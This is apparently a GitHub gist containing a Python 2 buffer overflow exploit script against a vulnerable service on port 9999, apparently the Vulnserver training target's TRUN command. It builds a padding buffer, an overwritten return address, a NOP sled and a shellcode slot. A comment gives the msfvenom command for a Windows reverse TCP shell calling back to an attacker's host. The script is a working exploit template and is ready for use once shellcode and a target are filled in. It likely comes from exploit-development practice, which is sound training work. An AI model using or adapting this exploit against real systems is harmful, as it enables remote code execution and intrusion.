#date: 2022-11-17T17:09:49Z
#url: https://api.github.com/gists/f10876beeee109359a7936ec79ccee25
#owner: https://api.github.com/users/Tamirye

#!/usr/bin/python2
import sys
import socket
from time import sleep

buff = "A" * 2003
eip = "\xaf\x11\x50\x62"
nops = "\x90" * 32
shellcode = (
#msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IPlport=YOUR-PORT EXITFUNC=thread -f c -b "\x00"
"<shell code goes here>")

try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect(('<server-ip>', 9999))
        payload = 'TRUN /.:/' + buff + eip + nops + shellcode
        soc.send(payload)
        soc.close()
except:
        print("[-] Error connecting to the server")
        sys.exit()
